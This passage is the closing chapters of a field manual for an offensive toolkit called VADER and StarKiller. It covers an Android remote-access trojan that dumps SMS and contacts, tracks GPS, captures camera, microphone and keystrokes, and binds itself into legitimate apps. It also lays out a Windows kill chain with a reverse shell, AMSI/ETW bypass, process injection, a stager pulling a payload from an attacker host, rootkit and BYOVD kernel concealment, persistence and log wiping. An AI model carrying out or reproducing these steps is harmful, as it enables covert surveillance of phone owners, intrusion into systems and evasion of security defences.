python server/starkiller_c2.py --port 8667
# Web dashboard on :8666, agent listener on :8667
```

### Protocol
Same as VADER: length-prefixed JSON over TCP.

```json
{"op": "device_info"}
{"op": "sms_dump", "args": {"limit": 100}}
{"op": "gps_track", "args": {"duration": 60}}
{"op": "camera_capture", "args": {"camera": "front"}}
```

### 17 Operations
1. device_info, 2. app_list, 3. contacts_dump, 4. sms_dump, 5. call_log,
6. gps_track, 7. camera_capture, 8. mic_record, 9. screen_capture,
10. file_list, 11. file_download, 12. file_upload, 13. keylog_start,
14. keylog_stop, 15. notif_dump, 16. shell_exec, 17. self_destruct

---

<a name="chapter-25-obfuscation"></a>
## Chapter 25: Obfuscation & Binding

### obfuscate.py
Transforms the APK to evade static analysis:
- Class/method renaming
- String encryption
- Control flow obfuscation
- Resource obfuscation

### binder.py
Embeds StarKiller into a legitimate APK:
```bash
python binder.py --carrier legitimate.apk --payload starkiller.apk --output bound.apk
```
The resulting APK looks and functions like the legitimate app but runs StarKiller in the background.

---

# PART VI — OPERATIONS

---

<a name="chapter-26-recon"></a>
## Chapter 26: Reconnaissance

### vader_recon.ps1 / sw_recon.ps1

17-section automated reconnaissance scanner:

```powershell
powershell -ep bypass -f recon\vader_recon.ps1
```

**Sections scanned:**
1. System info (OS, build, architecture)
2. Network configuration (IPs, adapters, DNS)
3. User accounts and groups
4. Running processes
5. Installed software
6. Scheduled tasks
7. Services (running + stopped)
8. Firewall rules
9. Open ports
10. ARP table
11. Routing table
12. Environment variables
13. Startup programs
14. Recently modified files
15. Shadow copies
16. Defender status
17. Credential storage locations

### Hunter Scripts
```powershell
# Find privilege escalation vectors
powershell -ep bypass -f sideload\hunter.ps1      # v1 — service ACL scanner
powershell -ep bypass -f sideload\hunter_v2.ps1    # v2 — expanded DLL search
```

---

<a name="chapter-27-kill-chain"></a>
## Chapter 27: Full Kill Chain Execution

### Pre-Flight Checklist

```
[ ] Recon complete — target profiled
[ ] All binaries compiled — python deploy.py --compile
[ ] Defender scan clean — python deploy.py --status (0 detected)
[ ] XOR keys rotated — python mutate.py (fresh keys for this engagement)
[ ] C2 listener ready — python vader_ui.py (web dashboard)
[ ] Network path confirmed — attacker can reach target and vice versa
```

### Execution Sequence

```
STEP 1: ESTABLISH C2
  Attacker: python vader_ui.py                    # start web dashboard
  Target:   vader_shell.exe                       # reverse shell connects back

STEP 2: BLIND TARGET
  Target:   dark_room.exe --test                  # AMSI + ETW bypass
  Verify:   "AMSI bypass: OK", "ETW bypass: OK"

STEP 3: ESCALATE PRIVILEGES
  Target:   WsNativePushService.exe               # V4 service replacement
  Verify:   Check canary — python deploy.py --canary V4

STEP 4: INJECT INTO PROCESSES
  Target:   vader_inject.exe <pid> vader_inject.dll
  Verify:   Target process AMSI is now blind

STEP 5: STAGE PAYLOADS (if needed)
  Attacker: python stagers/vader_serve.py         # HTTP file server
  Target:   vader_stager.exe http://ATTACKER:8888/payload.exe

STEP 6: ACTIVATE CONCEALMENT
  Target:   cloak_loader.exe cloak.dll            # system-wide user-mode cloak
  Verify:   Process gone from Task Manager, files gone from dir, connection gone from netstat

STEP 7: KERNEL CONCEALMENT (optional)
  Target:   kernel_cloak.exe RTCore64.sys <pid>   # BYOVD + DKOM
  Verify:   Process invisible even to kernel debuggers

STEP 8: OPERATE
  Use C2 dashboard for command dispatch
  Collect intelligence, maintain access

STEP 9: CLEANUP
  Target:   vader_clean.exe --canary --logs --timestamps --self-delete
  Verify:   No artifacts remain
```

---

<a name="chapter-28-post-exploitation"></a>
## Chapter 28: Post-Exploitation

### With SYSTEM Access

Once privilege escalation succeeds:
- Full filesystem access
- Credential extraction (SAM database, LSA secrets)
- Service installation for persistence
- Registry modification
- Scheduled task creation
- Network pivoting

### Persistence Mechanisms

| Method | Technique | Survives Reboot |
|--------|-----------|----------------|
| Service creation | `sc create` with SYSTEM | Yes |
| Scheduled task | SYSTEM-level task | Yes |
| Registry run key | HKLM\Software\Microsoft\Windows\CurrentVersion\Run | Yes |
| DLL sideload | Place in persistent service DLL path | Yes |

---

<a name="chapter-29-opsec"></a>
## Chapter 29: OPSEC & Counter-Forensics

### Operational Rules

1. **Rotate keys before every engagement** — `python mutate.py`
2. **Never reuse a binary across targets** — each target gets a fresh mutation
3. **Test against Defender before deployment** — `python deploy.py --status`
4. **Recon before exploit** — `vader_recon.ps1` first, always
5. **Clean up after every engagement** — `vader_clean.exe`
6. **Document everything** — `pentest_report.py` for engagement logging

### What VADER Hides From

- EDR user-mode hooks (indirect syscalls)
- Static signature detection (XOR encoding + mutation)
- AMSI script scanning (hardware breakpoint bypass)
- ETW process telemetry (hardware breakpoint bypass)
- Process enumeration (NtQuerySystemInformation hook)
- File enumeration (NtQueryDirectoryFile hook)
- Network enumeration (NtDeviceIoControlFile hook)
- Kernel process lists (DKOM via BYOVD)

### What VADER Does NOT Hide From

- Kernel debuggers with DR7 monitoring
- Memory forensics (Volatility examining hook bytes)
- Network traffic analysis (raw TCP, not encrypted)
- HVCI-enabled systems (blocks BYOVD)
- Hypervisor-based security (Credential Guard)

---

<a name="chapter-30-reporting"></a>
## Chapter 30: Engagement Reporting

### Engagement Log Format

Each engagement produces a log entry:

```
ENGAGEMENT: #XX
DATE: YYYY-MM-DD
TARGET: [description]
VECTOR: V4/V5/V6/V7
RESULT: SUCCESS/PARTIAL/FAILURE
FINDINGS: [numbered list]
EVIDENCE: [screenshots, logs, canary files]
```

### Evidence Collection
```powershell
# Automated evidence capture
powershell -ep bypass -f tests\capture_evidence.ps1
```

### Reports
- `FINDINGS.md` — cumulative findings across all engagements
- `ENGAGEMENT_LOG.md` — chronological engagement history
- `pentest_report.py` — automated report generation

---

# PART VII — REFERENCE

---

<a name="appendix-a"></a>
## Appendix A: Tool Quick Reference

| Tool | Command | Purpose |
|------|---------|---------|
| vader_menu.py | `python vader_menu.py` | Terminal dashboard |
| vader_ui.py | `python vader_ui.py` | Web C2 dashboard (:8666) |
| deploy.py | `python deploy.py --help` | Orchestration |
| mutate.py | `python mutate.py` | XOR key rotation |
| metamorph.py | `python metamorph.py` | Structural transforms |
| vader_evolve.py | `python vader_evolve.py` | Full mutation pipeline |
| vader_agent.py | `python vader_agent.py IP` | C2 agent |
| sith_menu.py | `python sith_menu.py` | SithStalker dashboard |
| sw_menu.py | `python sw_menu.py` | SkyWalker dashboard |
| vader_recon.ps1 | `powershell -ep bypass -f ...` | 17-section recon |
| hunter.ps1 | `powershell -ep bypass -f ...` | Privesc scanner |
| scan_all.py | `python tests/scan_all.py` | Defender scan all binaries |

---

<a name="appendix-b"></a>
## Appendix B: Port Map & Infrastructure

| Port | Service | Repo |
|------|---------|------|
| 4444 | Reverse shell listener | VADER |
| 8666 | Web C2 dashboard (HTTP) | VADER / StarKiller |
| 8667 | Agent listener (TCP) | VADER / StarKiller |
| 8888 | HTTP stager server | VADER |

---

<a name="appendix-c"></a>
## Appendix C: Troubleshooting

| Problem | Solution |
|---------|----------|
| `cl.exe` not found | Run `vcvars64.bat` first |
| `ml64.exe` not found | Install MASM via VS Installer |
| Defender detects a binary | Run `python mutate.py` to rotate keys |
| Mutation loop fails 10+ times | Switch to SkyWalker |
| BYOVD driver won't load | Check HVCI is OFF, run as admin |
| vader_ui.py port in use | `netstat -ano | findstr 8666` → kill PID |
| Agent won't connect | Check firewall rules, verify IP/port |
| DLL injection fails | Verify target PID exists, run as admin |
| Cloak not hiding processes | Verify cloak_loader.exe is still running |
| Unicode errors in output | Add `sys.stdout.reconfigure(encoding='utf-8')` |

---

<a name="appendix-d"></a>
## Appendix D: Build from Ashes

Each repo has a `BUILD_FROM_ASHES.md` document in its `docs/` directory:

| Repo | Document |
|------|----------|
| VADER | `vader-rootkit/docs/BUILD_FROM_ASHES.md` |
| SithStalker | `sith-stalker/docs/BUILD_FROM_ASHES.md` |
| SkyWalker | `skywalker/docs/BUILD_FROM_ASHES.md` |
| StarKiller | `starkiller/docs/BUILD_FROM_ASHES.md` |

These documents contain step-by-step instructions to rebuild each project from source on a fresh machine.

---

<a name="appendix-e"></a>
## Appendix E: Israeli Doctrine Alignment

**Full reference:** `vader-rootkit/docs/ISRAELI_DOCTRINE.md`

| Principle | Status | Gap |
|-----------|--------|-----|
| Build from scratch | 53K LOC original | — |
| Per-target unique builds | Mutation pipeline | Scale |
| Dual-toolset resilience | VADER + SkyWalker | Only 2 |
| Memory-resident operation | Disk-based | Fileless mode needed |
| Traffic mimicry | Raw TCP | HTTPS needed |
| Concealment (user-mode) | Full parity | — |
| Concealment (kernel) | BYOVD | Custom driver needed |
| Documentation | 70 findings, 19 engagements | Exceeds most |
| OPSEC hygiene | XOR strings, indirect syscalls | — |

---

```
END OF MANUAL

TACTICAL CYBER OPERATIONS — FIELD MANUAL v1.0
george wu / 22DIV / VADER
21 JUN 2026

"The hunt never ends."
```
